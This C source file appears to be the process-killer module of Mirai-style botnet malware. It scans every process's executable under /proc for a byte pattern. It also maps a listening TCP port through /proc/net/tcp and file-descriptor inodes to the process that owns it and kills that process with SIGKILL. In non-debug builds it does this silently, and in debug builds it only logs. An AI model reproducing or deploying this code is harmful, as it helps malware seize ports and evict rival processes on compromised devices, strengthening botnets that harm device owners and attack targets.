#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "includes.h"
#include "killer.h"
#include "util.h"

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len) {
  int matches = 0;

  if (str_len > buf_len) return FALSE;

  while (buf_len--) {
    if (*buf++ == str[matches]) {
      if (++matches == str_len) return TRUE;
    } else
      matches = 0;
  }

  return FALSE;
}

BOOL memory_scan_match(char *path, char* pattern){
  int fd, ret;
  char rdbuf[4096];
  BOOL found = FALSE;

  if ((fd = open(path, O_RDONLY)) == -1)
    return FALSE;

  while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0){
    if (mem_exists(rdbuf, ret, pattern, util_strlen(pattern))){
      found = TRUE;
      break;
    }
  }
  close(fd);
  return found;
}

BOOL has_exe_access(void) {
  char path[PATH_MAX], *ptr_path = path, tmp[16];
  int fd, k_rp_len;

  ptr_path += util_strcpy(ptr_path, "/proc/");
  ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
  ptr_path += util_strcpy(ptr_path, "/exe");

  if ((fd = open(path, O_RDONLY)) == -1) {
    return FALSE;
  }
  close(fd);
  util_zero(path, ptr_path - path);
  return TRUE;
}

pid_t find_pattern(char* pattern){
  uint32_t scan_counter = 0;
  struct sockaddr_in tmp_bind_addr;
  pid_t res_pid = -1;

  if (!has_exe_access()){
    write(2, "Machine does not have /proc/$pid/exe\n", 37);
    return -1;
  }
  write(2, "Memory scanning processes\n", 26);

  DIR *dir;
  struct dirent *file;

  if ((dir = opendir("/proc")) == NULL){
    write(2, "Failed to open /proc!\n", util_strlen("Failed to open /proc!\n"));
    return -1;
  }

  while ((file = readdir(dir)) != NULL){
    if (*(file->d_name) < '0' || *(file->d_name) > '9')
      continue;

    char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
    char status_path[64], *ptr_status_path = status_path;
    int rp_len, fd, pid = atoi(file->d_name);

    ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
    ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
    ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");

    // Store /proc/$pid/status into status_path
    ptr_status_path += util_strcpy(ptr_status_path, "/proc/");
    ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
    ptr_status_path += util_strcpy(ptr_status_path, "/status");

    if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1){
        realpath[rp_len] = 0;

      if (pid == getpid() || pid == getppid())
        continue;

      if ((fd = open(realpath, O_RDONLY)) == -1){
        //kill(pid, 9);
      }
      close(fd);
    }

    if (memory_scan_match(exe_path, pattern)){
      write(2, "Memory scan match for binary ", util_strlen("Memory scan match for binary "));
      write(2, exe_path, util_strlen(exe_path));
      write(2, "\n", 1);
      res_pid = pid;
      break;
      //kill(pid, 9);
    } 
    util_zero(exe_path, sizeof (exe_path));
    util_zero(status_path, sizeof (status_path));
  }
  closedir(dir);
  return res_pid;
}
void kill_pid(pid_t pid) { kill(pid, 9); }

BOOL kill_port(port_t port) {
  DIR *dir, *fd_dir;
  struct dirent *entry, *fd_entry;
  char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
  int pid = 0, fd = 0;
  char inode[16] = {0};
  char *ptr_path = path;
  int ret = 0;
  char port_str[16];

  util_itoa(ntohs(port), 16, port_str);
  if (util_strlen(port_str) == 2) {
    port_str[2] = port_str[0];
    port_str[3] = port_str[1];
    port_str[4] = 0;
    port_str[0] = '0';
    port_str[1] = '0';
  }
  fd = open("/proc/net/tcp", O_RDONLY);
  if (fd == -1) return 0;

  while (util_fdgets(buffer, 512, fd) != NULL) {
    int i = 0, ii = 0;

    while (buffer[i] != 0 && buffer[i] != ':') i++;

    if (buffer[i] == 0) continue;
    i += 2;
    ii = i;

    while (buffer[i] != 0 && buffer[i] != ' ') i++;
    buffer[i++] = 0;

    if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) !=
        -1) {
      int column_index = 0;
      BOOL in_column = FALSE;
      BOOL listening_state = FALSE;

      while (column_index < 7 && buffer[++i] != 0) {
        if (buffer[i] == ' ' || buffer[i] == '\t')
          in_column = TRUE;
        else {
          if (in_column == TRUE) column_index++;

          if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A') {
            listening_state = TRUE;
          }
          in_column = FALSE;
        }
      }
      ii = i;

      if (listening_state == FALSE) continue;

      while (buffer[i] != 0 && buffer[i] != ' ') i++;
      buffer[i++] = 0;

      if (util_strlen(&(buffer[ii])) > 15) continue;

      util_strcpy(inode, &(buffer[ii]));
      break;
    }
  }
  close(fd);

  if (util_strlen(inode) == 0) {
#ifdef DEBUG
    printf("Failed to find inode for port %d\n", ntohs(port));
#endif
    return 0;
  }
#ifdef DEBUG
  printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

  if ((dir = opendir("/proc/")) != NULL) {
    while ((entry = readdir(dir)) != NULL && ret == 0) {
      char *pid = entry->d_name;

      // skip all folders that are not PIDs
      if (*pid < '0' || *pid > '9') continue;

      util_strcpy(ptr_path, "/proc/");
      util_strcpy(ptr_path + util_strlen(ptr_path), pid);
      util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

      if (readlink(path, exe, PATH_MAX) == -1) continue;

      util_strcpy(ptr_path, "/proc/");
      util_strcpy(ptr_path + util_strlen(ptr_path), pid);
      util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
      if ((fd_dir = opendir(path)) != NULL) {
        while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0) {
          char *fd_str = fd_entry->d_name;

          util_zero(exe, PATH_MAX);
          util_strcpy(ptr_path, "/proc/");
          util_strcpy(ptr_path + util_strlen(ptr_path), pid);
          util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
          util_strcpy(ptr_path + util_strlen(ptr_path), "/");
          util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
          if (readlink(path, exe, PATH_MAX) == -1) continue;

          if (util_stristr(exe, util_strlen(exe), inode) != -1) {
#ifdef DEBUG
            printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10),
                   ntohs(port));
#else
            kill(util_atoi(pid, 10), 9);
#endif
            ret = 1;
          }
        }
        closedir(fd_dir);
      }
    }
    closedir(dir);
  }

  sleep(1);

  return ret;
}

